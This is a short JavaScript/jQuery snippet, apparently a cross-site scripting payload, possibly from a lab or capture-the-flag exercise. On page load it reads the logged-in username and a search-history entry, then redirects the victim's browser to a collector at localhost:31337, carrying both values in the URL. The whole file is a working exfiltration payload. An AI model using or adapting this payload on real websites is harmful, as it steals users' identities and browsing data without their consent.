$( document ).ready(function() {
        var last_search = document.querySelectorAll('.history-item.list-group-item')[1].innerText;
        var stolen_user = document.getElementById('logged-in-user').innerText;
        var url = 'http://localhost:31337/?stolen_user=' + stolen_user + '&last_search=' + last_search;
        window.location.replace(url);
});
